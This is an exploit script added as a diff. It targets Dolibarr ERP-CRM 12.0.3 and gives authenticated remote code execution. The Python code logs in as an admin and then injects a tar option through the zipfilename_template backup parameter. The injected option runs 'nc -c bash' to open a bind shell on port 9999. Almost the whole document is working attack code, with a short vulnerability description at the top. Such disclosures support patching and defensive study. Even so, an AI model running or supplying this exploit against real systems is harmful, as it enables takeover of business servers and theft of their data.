@@ -1,0 +1,77 @@
+# Exploit Title: Dolibarr ERP-CRM 12.0.3 - Remote Code Execution (Authenticated)
+# Date: 2020.12.17
+# Exploit Author: Yilmaz Degirmenci
+# Vendor Homepage: https://github.com/Dolibarr/dolibarr
+# Software Link: https://sourceforge.net/projects/dolibarr/
+# Version: 12.0.3
+# Tested on: Kali Linux 2020.2
+
+# Vulnerability Description: Open source ERP-CRM Dolibarr 12.0.3 is
+# vulnerable to authenticated Remote Code Execution Attack. An attacker who
+# has the access the admin dashboard can manipulate the backup function by
+# inserting payload into the zipfilename_template parameter at page
+# /admin/tools/dolibarr_export.php by clicking on the button "Generate
+# Backup" thus triggering command injection on target system.
+
+import requests
+from bs4 import BeautifulSoup
+from bs4 import Comment
+import re
+import lxml
+import json
+import urllib
+
+username = input("username: ")
+password = input("password: ")
+root_url = input("Root URL: http://192.168.0.15/ --> ")
+
+print("Exploit is sent! Check out if the bind shell on port 9999 active!")
+
+listener_port = "9999"
+
+login_url = root_url + "/index.php?mainmenu=home "
+vulnerable_url = root_url + "/admin/tools/dolibarr_export.php"
+upload_url = root_url + "/admin/tools/export_files.php"
+
+session = requests.Session()
+request = session.get(login_url)
+
+# Get the token value
+soup = BeautifulSoup(request.text,"lxml")
+token = soup.find("input",{'name':'token'})['value']
+
+# Login
+body = {"token":token, "actionlogin":"login",
+"loginfunction":"loginfunction", "tz":"-5",
+"tz_string":"America%2FNew_York", "dst_observed":"1",
+"dst_first":"2020-03-8T01%3A59%3A00Z", "dst_second":
+"2020-11-1T01%3A59%3A00Z", "screenwidth":"1668", "screenheight":"664",
+"dol_hide_topmenu":"", "dol_hide_leftmenu":"",
+"dol_optimize_smallscreen":"", "dol_no_mouse_hover":"",
+"dol_use_jmobile":"", "username":username,"password":password}
+
+session.post(login_url, data=body, cookies=request.cookies)
+
+request = session.get(vulnerable_url)
+token = soup.find("input",{'name':'token'})['value']
+
+header = {
+"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0)
+Gecko/20100101 Firefox/80.0",
+"Accept":"*/",
+"Accept-Encoding": "gzip, deflate",
+"Origin": root_url,
+"Referer":
+root_url+"/admin/tools/dolibarr_export.php?mainmenu=home&leftmenu=admintools",
+"Upgrade-Insecure-Requests": "1"
+}
+
+body = {"token":token, "export_type":"server", "page_y":"1039",
+"zipfilename_template":"documents_dolibarr_12.0.3_202012160422.tar
+--use-compress-program='nc -c bash -nlvp  9999' %0a  :: ",
+"compression":"gz"}
+
+param = urllib.parse.urlencode(body, quote_via=urllib.parse.quote)
+
+session.post(upload_url, data=body, params=param, cookies=request.cookies, headers=header)
